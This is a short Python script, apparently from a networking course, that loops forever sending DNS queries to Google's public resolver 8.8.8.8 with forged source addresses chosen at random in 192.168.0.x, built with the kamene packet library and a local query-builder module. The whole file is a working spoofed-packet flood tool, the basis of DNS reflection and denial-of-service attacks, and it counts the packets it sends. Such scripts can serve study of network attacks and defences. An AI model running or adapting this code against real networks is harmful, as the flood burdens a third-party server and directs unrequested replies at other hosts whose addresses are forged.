# from dust i have come, dust i will be

import socket
import random
import signal
from DNS_QueryBuilder import *
from kamene.all import *

cnt = 0

def keyboardInterruptHandler(signal, frame):
    print("KeyboardInterrupt (ID: {}) has been caught. Cleaning up...".format(signal))
    print(cnt, "packets sent so far")
    exit(0)

signal.signal(signal.SIGINT, keyboardInterruptHandler)

# the invalid domains are sent but no response returns
domains = ['codeforces.com', 'codechef.com', 'buet.ac.bd', 'cse.buet.ac.bd', 'youtube.com', \
		   'github.com', 'ubuntu.com', 'example.com', 'cse.buet.ac.bd', 'en.wikipedia.org']

while True:

	src_ip = '192.168.0.' + str(random.randint(10, 110))
	dest_ip = '8.8.8.8'

	src_port = 107
	dest_port = 53

	# --------------------------------
	# dns query - select a random domain
	random_domain = random.randint(0, len(domains) - 1)
	
	q = dns_query()
	q.setShowError(True)
	q.setShowReport(True)
	q.setDomainName(domains[random_domain])

	payload = q.getDNSQuery()
	payload = binascii.unhexlify(payload)
	# --------------------------------


	spoofed_packet = IP(src=src_ip, dst=dest_ip) / UDP(sport=src_port, dport=dest_port) / payload
	send(spoofed_packet)

	cnt += 1